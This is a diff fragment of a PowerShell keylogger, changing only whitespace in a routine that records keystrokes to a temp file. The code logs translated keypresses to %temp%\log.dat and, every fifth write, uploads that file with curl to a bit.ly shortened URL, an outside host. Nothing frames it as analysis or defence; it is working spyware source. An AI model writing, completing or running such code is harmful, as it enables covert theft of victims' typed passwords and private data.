@@ -30,7 +30,6 @@ function run-key()
           $mychar = New-Object -TypeName System.Text.StringBuilder
           # translate virtual key
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
           if ($success)
           {
             # add key to logger file
@@ -40,12 +39,12 @@ function run-key()
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
-			  $send++
-			  if ($send -ge 5)
-			  {
-				$send = 0
+              $send++
+              if ($send -ge 5)
+              {
+                $send = 0
                 cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3DHmzBN"
-			  }
+              }
             }
             if ($lista.endswith("9"))
             {
